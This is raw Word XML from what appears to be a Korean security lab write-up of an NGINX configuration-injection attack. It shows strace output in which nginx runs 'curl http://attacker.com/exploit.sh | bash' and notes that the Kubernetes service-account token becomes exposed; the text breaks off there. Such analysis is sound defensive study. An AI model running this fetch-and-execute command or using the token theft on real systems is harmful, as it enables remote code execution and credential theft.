                              <w:t>"-c"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 xml:space="preserve">, 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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"curl http://attacker.com/exploit.sh | bash"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], ...)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br/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[</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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pid</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>12346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] connect(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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>3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, {</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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sa_family</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve">=AF_INET, </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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sin_port</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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=</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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htons</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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(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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>80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 xml:space="preserve">), </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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sin_addr</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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=</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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inet_addr</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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(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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>10.0.2.15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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"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 xml:space="preserve">)}, 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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>16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)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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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//</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767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sin_addr</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767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: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CF2767"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소켓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CF2767"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주소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CF2767"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구조체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CF2767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sockaddr_in</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767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)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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에서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 xml:space="preserve"> "IP </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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주소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"</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767"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를</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767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CF2767"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저장하는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CF2767"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필드</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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 xml:space="preserve">, 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}, 16):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CF2767"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소켓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CF2767"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주소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CF2767"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구조체의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CF2767"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크기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(16</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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바이트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)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF2767"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를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CF2767"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의미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7A499D" id="_x0000_s1036" style="width:419.25pt;height:15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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="526A8C45" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5C941778" w14:textId="5FA48992" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"># </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>strace</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -f -p $(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>pgrep</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> nginx)</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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[</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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pid</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>12345</w:t>
                      </w:r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 xml:space="preserve">] </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/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execve</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"/bin/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>sh</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r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, [</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"/bin/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>sh</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r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 xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"-c"</w:t>
                      </w:r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 xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"curl http://attacker.com/exploit.sh | bash"</w:t>
                      </w:r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], ...)</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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[</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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pid</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>12346</w:t>
                      </w:r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] connect(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>3</w:t>
                      </w:r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, {</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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sa_family</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve">=AF_INET, </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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sin_port</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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=</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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htons</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>80</w:t>
                      </w:r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 xml:space="preserve">), </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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sin_addr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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=</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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inet_addr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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(</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>10.0.2.15</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="9BBB59" w:themeColor="accent3"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r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 xml:space="preserve">)}, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767">
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                          <w:color w:val="F79646" w:themeColor="accent6"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>16</w:t>
                      </w:r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)</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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//</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767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sin_addr</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767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:</w:t>
                      </w:r>
                      <w:r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CF2767"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소켓</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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주소</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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구조체</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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(</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767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sockaddr_in</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767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)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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에서</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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 xml:space="preserve"> "IP </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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주소</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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"</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF2767"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를</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF2767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CF2767"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저장하는</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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필드</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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 xml:space="preserve">, </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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}, 16):</w:t>
                      </w:r>
                      <w:r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CF2767"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소켓</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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주소</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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구조체의</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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CF2767"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크기</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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(16</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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바이트</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767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)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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를</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF2767"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CF2767"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의미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A8881F1" w14:textId="5F246D87" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>결과 해석</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에러</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>메시지</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">: exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>디렉티브</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위치</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>오류는</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> NGINX </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>검증</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실패를</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의미하지만</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>코드는</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이미</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행됨</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F99298" w14:textId="41EDE985" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>성공</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>: exploit.sh</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>가</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다운로드되어</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실행되면</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets(/var/run/secrets/kubernetes.io/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>serviceaccount</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">/token) </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
